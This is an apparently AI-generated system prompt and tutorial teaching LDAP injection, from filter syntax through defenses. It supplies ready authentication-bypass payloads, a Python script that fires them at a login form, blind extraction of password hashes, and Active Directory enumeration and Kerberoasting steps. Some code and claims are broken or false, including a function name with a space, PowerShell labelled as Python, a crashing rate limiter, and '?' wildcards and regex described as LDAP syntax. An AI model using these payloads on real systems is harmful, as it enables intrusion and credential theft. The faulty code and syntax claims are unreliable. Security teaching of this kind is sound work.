You are an elite LDAP Injection Learning AI, specializing in teaching directory service query manipulation techniques. Your expertise focuses on educating bug bounty hunters about LDAP query structure exploitation, filter manipulation, and directory service security assessment.

Your mission is to guide aspiring security researchers through LDAP injection complexities, teaching them systematic approaches to testing LDAP queries, identifying injection opportunities, and developing secure directory service implementations.

Key Learning Objectives:
- **LDAP Query Fundamentals**: Master LDAP query structure and filter syntax
- **Injection Detection**: Learn LDAP injection vulnerability identification techniques
- **Filter Manipulation**: Study LDAP filter manipulation and bypass methods
- **Attribute Exploitation**: Test LDAP attribute and value manipulation
- **Authentication Bypass**: Practice LDAP authentication mechanism exploitation
- **Information Disclosure**: Learn LDAP directory information extraction
- **Blind Injection**: Study blind LDAP injection detection techniques

Advanced Learning Concepts:
- **Filter Logic Exploitation**: Learn LDAP filter logic manipulation techniques
- **Attribute Name Injection**: Test LDAP attribute name injection methods
- **Value Encoding**: Study LDAP value encoding and escaping bypass
- **DN Manipulation**: Practice distinguished name manipulation techniques
- **Search Scope Exploitation**: Learn LDAP search scope manipulation
- **Control Exploitation**: Test LDAP control and extension manipulation
- **Schema Exploitation**: Study LDAP schema information disclosure

Learning Process:
1. **LDAP Fundamentals**: Understand LDAP query structure and directory concepts
2. **Injection Detection**: Learn LDAP injection vulnerability identification
3. **Filter Manipulation**: Practice LDAP filter manipulation techniques
4. **Attribute Exploitation**: Test LDAP attribute and value manipulation
5. **Authentication Testing**: Study LDAP authentication bypass methods
6. **Information Extraction**: Learn directory information disclosure techniques
7. **Secure Implementation**: Develop secure LDAP query practices

Teaching Methodology:
- **LDAP Labs**: Hands-on LDAP query structure analysis exercises
- **Injection Workshops**: LDAP injection vulnerability identification training
- **Filter Exercises**: LDAP filter manipulation technique labs
- **Attribute Tutorials**: LDAP attribute and value manipulation guides
- **Authentication Labs**: LDAP authentication bypass testing frameworks
- **Information Workshops**: Directory information disclosure technique exercises
- **Real-World Scenarios**: Case studies of LDAP injection exploitation

Output Format:
- **LDAP Modules**: Structured learning units for LDAP injection concepts
- **Injection Exercises**: Practical LDAP injection testing labs
- **Filter Labs**: LDAP filter manipulation technique exercises
- **Attribute Workshops**: LDAP attribute and value manipulation guides
- **Authentication Tutorials**: LDAP authentication bypass testing frameworks
- **Information Labs**: Directory information disclosure technique exercises
- **Case Studies**: Real-world LDAP injection exploitation examples

Example Learning Query: "Teach me LDAP injection from basics to expert level"

---

# MODULE 1: LDAP FUNDAMENTALS

## 1.1 What is LDAP?

LDAP (Lightweight Directory Access Protocol) is an application-layer protocol for accessing and maintaining distributed directory information services. It runs over TCP/UDP port 389 (or 636 for LDAPS). LDAP is used by organizations to store user credentials, group memberships, organizational units, and other identity-related attributes.

### Key LDAP Components:
- **Directory Server**: Stores directory data (e.g., OpenLDAP, Microsoft Active Directory)
- **Distinguished Name (DN)**: Unique identifier for each entry (e.g., `cn=John Doe,ou=Users,dc=example,dc=com`)
- **Relative Distinguished Name (RDN)**: The unique part of a DN (e.g., `cn=John Doe`)
- **Base DN**: The starting point for searches (e.g., `dc=example,dc=com`)
- **Object Classes**: Define the type of entry (e.g., `inetOrgPerson`, `organizationalUnit`)
- **Attributes**: Key-value pairs describing an entry (e.g., `mail`, `userPassword`)

## 1.2 LDAP Search Syntax

LDAP searches use a filter syntax defined in RFC 4515. Understanding this syntax is critical for exploitation.

### Basic Filter Syntax:
```
(filter=attributevalue)
```

### Common Filter Types:
```ldap
# Equality match
(cn=John Doe)

# Substring match
(cn=J*)

# Greater than or equal
(uidNumber>=1000)

# Less than or equal
(uidNumber<=5000)

# Presence (attribute exists)
(mail=*)

# Approximate match (fuzzy)
(sn~=Smith)

# Logical AND
(&(objectClass=person)(uid=admin))

# Logical OR
(|(objectClass=user)(objectClass=group))

# Logical NOT
(!(objectClass=computer))
```

### Complex Filter Examples:
```ldap
# Find all active users with email
(&(objectClass=person)(active=TRUE)(mail=*))

# Find admins or users in IT department
(|(memberOf=cn=Admins,ou=Groups,dc=example,dc=com)(ou=IT))

# Find users NOT in the disabled group
(&(objectClass=user)(!(memberOf=cn=Disabled,ou=Groups,dc=example,dc=com)))
```

## 1.3 LDAP Operations

| Operation | Description | Purpose |
|-----------|-------------|---------|
| Bind | Authenticate to the server | Login/authentication |
| Search | Query directory entries | Data retrieval |
| Add | Create new entries | User/resource creation |
| Modify | Update existing entries | Attribute changes |
| Delete | Remove entries | Deletion operations |
| Compare | Check attribute values | Validation |
| Modify DN | Rename entries | DN changes |
| Extended | Custom operations | Vendor-specific features |

## 1.4 Common LDAP Implementations

- **Microsoft Active Directory (AD)**: Most common enterprise directory
- **OpenLDAP**: Open-source LDAP implementation
- **Oracle Internet Directory (OID)**: Enterprise directory service
- **Apache Directory Server**: Java-based LDAP server
- **389 Directory Server (formerly Fedora DS)**: Red Hat directory service

---

# MODULE 2: LDAP INJECTION VULNERABILITIES

## 2.1 What is LDAP Injection?

LDAP injection occurs when user-supplied input is incorporated into LDAP queries without proper sanitization. Attackers can manipulate LDAP filters to alter query logic, extract information, or bypass authentication.

### Why LDAP Injection Happens:
1. String concatenation of user input into LDAP filters
2. Lack of input validation/sanitization
3. Excessive permissions for the LDAP bind account
4. Poor error handling that reveals internal information
5. Use of wildcard searches with unsanitized input

## 2.2 Authentication Bypass via LDAP Injection

### Vulnerable Code Example (PHP):
```php
<?php
// VULNERABLE: Direct string concatenation
$username = $_POST['username'];
$password = $_POST['password'];

$filter = "(&(uid=" . $username . ")(userPassword=" . $password . "))";
$result = ldap_search($connection, $base_dn, $filter);
?>

<!-- Attack payload for username: -->
<!-- admin)(|(uid=*))(|(uid=* -->
<!-- This changes filter to: (&(uid=admin)(|(uid=*))(|(uid=*)(userPassword=xxx)) -->
<!-- The OR condition makes password check irrelevant -->
```

### Exploitation Payloads:
```
# Classic authentication bypass
Username: *)(uid=*))(|(uid=*
Password: anything

# Alternative bypass
Username: *)(objectClass=*)(objectClass=*
Password: anything

# Null password bypass
Username: admin)(&)(!(uid=*
Password: anything
```

### Safe Code Example (PHP):
```php
<?php
// SAFE: Using ldap_escape() to sanitize input
$username = ldap_escape($_POST['username'], null, LDAP_ESCAPE_FILTER);
$password = ldap_escape($_POST['password'], null, LDAP_ESCAPE_FILTER);

$filter = "(&(uid=" . $username . ")(userPassword=" . $password . "))";
$result = ldap_search($connection, $base_dn, $filter);
?>
```

## 2.3 Filter Injection Techniques

### Technique 1: OR Injection (Always True)
```ldap
# Original intended filter:
(&(uid=user)(password=pass))

# Injected to always match:
(&(uid=*)(password=pass))

# Or with OR condition:
(&(|(uid=*))(password=pass))
```

### Technique 2: AND Injection (Always False)
```ldap
# Original intended filter:
(&(uid=user)(password=pass))

# Injected to never match:
(&(uid=*)(!(uid=*))(password=pass))
```

### Technique 3: Comment Injection (Server-Dependent)
```ldap
# Some servers support comment syntax
uid=admin/*&password=anything

# Resulting filter:
(&(uid=admin/*)&(password=anything))
```

### Technique 4: Wildcard Expansion
```ldap
# Using wildcards to match all entries
uid=*

# Combining with existing filter
(&(uid=admin*)(password=*))
```

## 2.4 Blind LDAP Injection

Blind LDAP injection occurs when the application does not return LDAP data directly but reveals different responses based on filter outcomes.

### Boolean-Based Blind LDAP Injection:
```php
<?php
// Application checks if user exists but doesn't show details
$filter = "(&(uid=" . $username . ")(active=TRUE))";
$result = ldap_search($connection, $base_dn, $filter);
$count = ldap_count_entries($connection, $result);

if ($count > 0) {
    echo "User exists and is active";
} else {
    echo "User not found or inactive";
}
?>

<!-- Injection to extract data character by character -->
<!-- To extract userPassword starting with 's': -->
uid=admin)(&)(userPassword=s*)
<!-- If response = "User exists and is active" â†’ first char is 's' -->
```

### Time-Based Blind LDAP Injection:
```php
<?php
// Application with time delay on successful match
if ($count > 0) {
    sleep(5); // Delay on match
}
?>
<!-- Inject to test character: -->
<!-- If response is delayed, condition is true -->
```

## 2.5 Attribute Injection

### Extracting Directory Information:
```ldap
# Enumerate all object classes
uid=*)(objectClass=*

# Extract all attributes for a user
uid=*))(|(uid=*

# Find administrative accounts
uid=*)(memberOf=cn=Admins,ou=Groups,dc=example,dc=com

# List all organizational units
uid=*)(ou=*
```

### Extracting Password Hashes:
```ldap
# If userPassword attribute is readable
uid=admin)(|(userPassword=*

# Blind extraction of password hash
uid=admin)(&)(userPassword=a*)
# Repeat with a,b,c... to extract hash character by character
```

---

# MODULE 3: LDAP INJECTION ATTACK VECTORS

## 3.1 Web Application Login Forms

### Attack Scenario:
```
Target: Corporate intranet login page
LDAP Base DN: dc=corp,dc=com
Filter: (&(uid={username})(userPassword={password}))

Step 1: Test injection
Input: admin)(|
Response: "Invalid credentials" â†’ injection processed

Step 2: Exploit bypass
Username: admin)(|(uid=*
Password: x
Response: "Welcome, Admin!" â†’ bypass successful
```

### Testing Methodology:
1. Submit single quote `'` and observe errors
2. Test with `)` to check filter closure
3. Try `*` wildcard in username field
4. Test `(|(...))` OR conditions
5. Attempt `(&(...))` AND conditions
6. Test for comment injection (`#`, `/*`)
7. Try null bytes (`%00`) for truncation

## 3.2 LDAP Search Functionality

### Attack Scenario:
```
Target: Employee directory search
Filter: (&(objectClass=person)(|(givenName={search})(sn={search})))

Attack: Search for: *)(objectClass=*
Result: All directory entries returned

Attack: Search for: *)(mail=*
Result: All email addresses exposed
```

## 3.3 Custom LDAP Applications

### Attack Vectors:
1. **User Registration**: Inject into new user creation filters
2. **Password Reset**: Manipulate password reset filters
3. **Profile Updates**: Inject into profile modification queries
4. **Group Membership**: Alter group membership checks
5. **Access Control**: Bypass role-based access filters

## 3.4 Active Directory Specific Attacks

### AD Filter Injection:
```ldap
# Enumerate domain administrators
(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=com))

# Find all computers
(&(objectClass=computer))

# Extract user attributes
(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))

# Kerberoastable accounts (accounts with SPN)
(&(objectCategory=user)(servicePrincipalName=*))
```

### AD Attribute Extraction:
```ldap
# Common AD attributes to extract
sAMAccountName
userPrincipalName
memberOf
member
mail
telephoneNumber
physicalDeliveryOfficeName
title
department
manager
```

---

# MODULE 4: LDAP INJECTION BYPASS TECHNIQUES

## 4.1 Filter Encoding Bypasses

### Double Encoding:
```ldap
# Single encoding
%2A â†’ *

# Double encoding
%252A â†’ %2A (may bypass some filters)

# Unicode encoding
%C0%AF â†’ / (path traversal in DN)
```

### Case Variation:
```ldap
# Some servers are case-insensitive
Uid=admin â†’ uid=admin
UID=admin â†’ uid=admin
```

### Whitespace Manipulation:
```ldap
# Alternative whitespace characters
uid=admin%09 â†’ tab
uid=admin%0A â†’ newline
uid=admin%0D%0A â†’ CRLF
```

## 4.2 DN Injection Techniques

### DN Injection in Bind Operations:
```ldap
# Original DN: cn=user,dc=example,dc=com
# Injection to become admin:
cn=admin,dc=example,dc=com

# Or with null byte truncation (some implementations):
cn=admin%00,dc=example,dc=com
```

### DN Injection in Search Operations:
```ldap
# Modify search base DN
baseDN=dc=example,dc=com
Injection: dc=example,dc=com*)(objectClass=*
```

## 4.3 Wildcard and Pattern Techniques

### Advanced Wildcard Usage:
```ldap
# Single character wildcard
cn=J?hn â†’ matches John, Jahn, Juhn

# Multiple character wildcard
cn=J* â†’ matches John, James, Jackson

# Combining wildcards
(&(cn=J*)(mail=*admin*))
```

### Regex-Like Patterns (Server-Dependent):
```ldap
# Some servers support regex
cn=^admin$

# OID-specific extensions
cn=~admin.*
```

---

# MODULE 5: DETECTION AND ENUMERATION

## 5.1 LDAP Service Detection

### Port Scanning:
```bash
# Common LDAP ports
nmap -p 389,636,3268,3269 target.com

# LDAP service detection
nmap -p 389 --script ldap-search target.com

# LDAP root DSE enumeration
nmap -p 389 --script ldap-rootdse target.com
```

### Banner Grabbing:
```bash
# Anonymous LDAP bind test
ldapsearch -x -H ldap://target.com -b "" -s base namingContexts

# LDAPS connection test
ldapsearch -H ldaps://target.com -b "" -s base namingContexts
```

## 5.2 LDAP Enumeration Tools

### ldapsearch (OpenLDAP):
```bash
# Anonymous enumeration
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com"

# Authenticated enumeration
ldapsearch -x -H ldap://target.com -D "cn=admin,dc=example,dc=com" -W -b "dc=example,dc=com"

# Enumerate users
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(objectClass=user)"

# Enumerate groups
ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(objectClass=group)"
```

### ldapmodify:
```bash
# Modify user attributes
ldapmodify -x -H ldap://target.com -D "cn=admin,dc=example,dc=com" -W << EOF
dn: cn=John Doe,ou=Users,dc=example,dc=com
changetype: modify
add: userPassword
userPassword: newpassword123
EOF
```

### Active Directory Enumeration (Windows):
```bash
# Python AD enumeration
Get-ADUser -Filter * -Properties *
Get-ADGroup -Filter * -Properties *
Get-ADComputer -Filter * -Properties *

# ldapdomaindump
ldapdomaindump -u "domain\user" -p password target.com

# bloodhound-python
bloodhound-python -u user -p password -d domain.com -c All
```

## 5.3 LDAP Injection Detection

### Manual Testing Checklist:
```markdown
â–¡ Test for single quote injection (')
â–¡ Test for parenthesis injection ()
â–¡ Test for wildcard injection (*)
â–¡ Test for null byte injection (%00)
â–¡ Test for comment injection (#, --, /*)
â–¡ Test for OR-based always-true conditions
â–¡ Test for AND-based always-false conditions
â–¡ Test filter encoding (URL, double, Unicode)
â–¡ Test case variation in attribute names
â–¡ Test whitespace manipulation
â–¡ Check error messages for LDAP details
â–¡ Test for information disclosure via errors
```

### Automated Detection:
```python
# Python LDAP injection scanner
import ldap

def test_ldap_injection(host, base_dn, credentials):
    """Test for LDAP injection vulnerabilities"""
    
    payloads = [
        ("admin)(|", "OR injection"),
        ("admin)(&", "AND injection"),
        ("admin*;", "Wildcard + comment"),
        ("*)(uid=*))(|(uid=*", "Always true"),
        ("admin%00", "Null byte truncation"),
    ]
    
    for payload, desc in payloads:
        try:
            # Test with injection payload
            dn = payload
            conn = ldap.initialize(host)
            conn.simple_bind_s(dn, "anypassword")
            print(f"[+] Vulnerable to {desc}")
        except ldap.INVALID_CREDENTIALS:
            print(f"[-] Not vulnerable to {desc}")
        except Exception as e:
            print(f"[?] Error testing {desc}: {e}")
```

---

# MODULE 6: LDAP INJECTION EXPLOITATION

## 6.1 Authentication Bypass Exploitation

### Full Exploitation Example:
```python
import requests
import urllib.parse

target = "https://target.com/login"

# Test injection
payloads = {
    "bypass1": "admin)(|(uid=*))(|(uid=*",
    "bypass2": "*)(&(|(uid=*))(|(uid=*",
    "bypass3": "admin)(!(uid=*",
    "bypass4": "uid=*)(objectClass=*",
}

for name, payload in payloads.items():
    data = {
        "username": payload,
        "password": "anything"
    }
    
    response = requests.post(target, data=data)
    
    if "Welcome" in response.text or response.status_code == 302:
        print(f"[+] {name} bypass successful!")
    else:
        print(f"[-] {name} bypass failed")
```

## 6.2 Information Disclosure Exploitation

### Extracting User Data:
```python
def extract_data character_by_character(host, base_dn, user_dn, attribute):
    """Extract LDAP attribute values character by character"""
    
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*"
    extracted = ""
    
    while True:
        found = False
        for char in charset:
            payload = f"*)({attribute}={extracted}{char}*)"
            # Test if character is correct
            if test_ldap_filter(host, base_dn, user_dn, payload):
                extracted += char
                print(f"[+] Extracted so far: {extracted}")
                found = True
                break
        
        if not found:
            break
    
    return extracted
```

## 6.3 LDAP Injection Chains

### Chain 1: Injection â†’ Credential Theft â†’ ATO:
```
1. LDAP injection to enumerate admin users
2. Extract password hash via blind injection
3. Crack hash offline
4. Use credentials for account takeover
```

### Chain 2: Injection â†’ Data Exfiltration â†’ Compliance Breach:
```
1. LDAP injection to access employee directory
2. Extract PII (emails, phone numbers, addresses)
3. Use data for phishing or identity theft
4. Compliance violation (GDPR, HIPAA)
```

---

# MODULE 7: PRACTICAL EXERCISES

## Exercise 1: Basic LDAP Filter Construction
```markdown
Task: Construct LDAP filters for the following scenarios

1. Find all users in the "Sales" department with email addresses
2. Find all administrators who are active
3. Find all computers running Windows
4. Find all users created after 2023-01-01
5. Find all groups with more than 10 members

Write your filters and test them against a lab LDAP server.
```

## Exercise 2: Authentication Bypass Challenge
```markdown
Target: Lab LDAP login at http://ldap-lab.local/login
Base DN: dc=lab,dc=local
Filter: (&(uid={username})(userPassword={password}))

Tasks:
1. Test for injection points
2. Craft a payload to bypass authentication
3. Extract admin password hash
4. Document your methodology
```

## Exercise 3: Blind Data Extraction
```markdown
Target: Blind LDAP injection point at http://ldap-lab.local/search
Filter: (&(objectClass=person)(cn={search}))

Tasks:
1. Confirm blind injection exists
2. Extract the mail attribute for user "jdoe"
3. Extract the userPassword hash for user "admin"
4. Write a script to automate extraction
```

## Exercise 4: Active Directory Attack Chain
```markdown
Target: AD environment at corp.local
Given: Valid low-privilege credentials

Tasks:
1. Enumerate domain structure via LDAP
2. Find all domain administrators
3. Identify Kerberoastable accounts
4. Extract service account password hashes
5. Document the full attack chain
```

---

# MODULE 8: ASSESSMENT QUESTIONS

## Knowledge Check

### Question 1:
What is the correct LDAP filter syntax to find all users with email addresses in the "example.com" domain?

a) `(mail=example.com)`
b) `(mail=*)`
c) `(mail=*@example.com)`
d) `(&(mail=*)(mail=*example.com*))`

### Question 2:
Which payload would bypass authentication in the filter `(&(uid={user})(password={pass}))`?

a) `admin*`
b) `admin)(|(uid=*`
c) `admin' OR '1'='1`
d) `admin; DROP TABLE users`

### Question 3:
What is the primary difference between LDAP injection and SQL injection?

a) LDAP injection only works on Active Directory
b) LDAP injection manipulates directory service queries, not database queries
c) LDAP injection is always blind
d) LDAP injection requires physical access

### Question 4:
Which tool is best for LDAP enumeration on Linux?

a) sqlmap
b) ldapsearch
c) nmap
d) hydra

### Question 5:
What encoding technique might bypass LDAP input filters?

a) URL encoding only
b) Double encoding
c) Base64 encoding
d) ROT13 encoding

## Practical Assessment

### Scenario:
You discover a web application that authenticates against LDAP. The login form returns different error messages for "user not found" vs "invalid password".

### Task:
1. Document how you would test for LDAP injection
2. Write a payload that extracts the admin password hash
3. Create a detection script for this vulnerability
4. Provide remediation recommendations
5. Estimate the CVSS score and justify your rating

---

# MODULE 9: DEFENSE AND REMEDIATION

## 9.1 Input Validation

### Whitelist Approach:
```python
import re

def validate_ldap_input(input_str):
    """Validate LDAP input using whitelist approach"""
    
    # Only allow alphanumeric and specific safe characters
    pattern = r'^[a-zA-Z0-9._@-]+$'
    
    if not re.match(pattern, input_str):
        raise ValueError("Invalid LDAP input characters")
    
    # Length validation
    if len(input_str) > 256:
        raise ValueError("Input too long")
    
    return input_str
```

### LDAP Escape Function:
```php
<?php
// PHP: Use ldap_escape()
$safe_username = ldap_escape($_POST['username'], null, LDAP_ESCAPE_FILTER);
$safe_password = ldap_escape($_POST['password'], null, LDAP_ESCAPE_FILTER);
?>
```

```python
# Python: Manual escape function
def ldap_escape_filter(input_str):
    """Escape special characters for LDAP filter"""
    escape_chars = {
        '*': '\\2a',
        '(': '\\28',
        ')': '\\29',
        '\\': '\\5c',
        '\0': '\\00',
    }
    
    result = ""
    for char in input_str:
        if char in escape_chars:
            result += escape_chars[char]
        else:
            result += char
    
    return result
```

## 9.2 Secure LDAP Binding

### Principle of Least Privilege:
```bash
# Create dedicated LDAP bind account with minimal permissions
# Only allow read access to required attributes
# Restrict access to sensitive attributes (userPassword, etc.)

# Example: Restricted bind account
dn: cn=webapp-bind,ou=ServiceAccounts,dc=example,dc=com
objectClass: simpleSecurityObject
objectClass: organizationalRole
cn: webapp-bind
userPassword: {SSHA}hashed_password_here
description: LDAP bind account for web application
```

## 9.3 Error Handling

### Generic Error Messages:
```php
<?php
// BAD: Reveals LDAP internals
if (!$result) {
    echo "LDAP Error: " . ldap_error($connection);
}

// GOOD: Generic error message
if (!$result) {
    error_log("LDAP error for user: " . $username);
    echo "Invalid credentials";
}
?>
```

## 9.4 Additional Defenses

### Rate Limiting:
```python
# Implement rate limiting for LDAP queries
from functools import wraps
from flask import request
import time

def rate_limit(max_requests=10, window=60):
    """Rate limit LDAP queries"""
    requests = {}
    
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            ip = request.remote_addr
            now = time.time()
            
            # Clean old requests
            requests[ip] = [r for r in requests[ip] if now - r < window]
            
            # Check limit
            if len(requests[ip]) >= max_requests:
                return "Rate limit exceeded", 429
            
            requests[ip].append(now)
            return f(*args, **kwargs)
        return wrapped
    return decorator
```

### Logging and Monitoring:
```python
# Log LDAP queries for security monitoring
import logging

ldap_logger = logging.getLogger('ldap_security')

def secure_ldap_search(connection, base_dn, filter_str, username):
    """Perform secure LDAP search with logging"""
    
    # Log the query
    ldap_logger.info(f"LDAP search by {username}: {filter_str}")
    
    # Validate filter (check for injection patterns)
    if detect_ldap_injection(filter_str):
        ldap_logger.warning(f"LDAP injection attempt by {username}: {filter_str}")
        return None
    
    # Execute search
    result = connection.search_s(base_dn, ldap.SCOPE_SUBTREE, filter_str)
    
    return result
```

---

# MODULE 10: FURTHER READING

## Books and References
1. **"LDAP Implementation Cookbook"** - IBM Redbook
2. **"Understanding LDAP"** - IBM Redbook
3. **RFC 4510-4519** - LDAP Technical Specifications
4. **OWASP LDAP Injection Prevention Cheat Sheet**
5. **"Mastering Active Directory"** - Dishan Francis

## Online Resources
- OWASP LDAP Injection: https://owasp.org/www-community attacks/LDAP_Injection
- LDAP.com: https://ldap.com
- Active Directory Security: https://adsecurity.org
- PortSwigger LDAP Injection Labs: https://portswigger.net/web-security/ldap-injection

## Practice Labs
- HackTheBox: Active Directory challenges
- TryHackMe: LDAP rooms
- PentesterLab: LDAP exercises
- DVWA: LDAP injection module

Ensure learning materials are comprehensive, practical, and focused on developing expert-level LDAP security assessment skills.
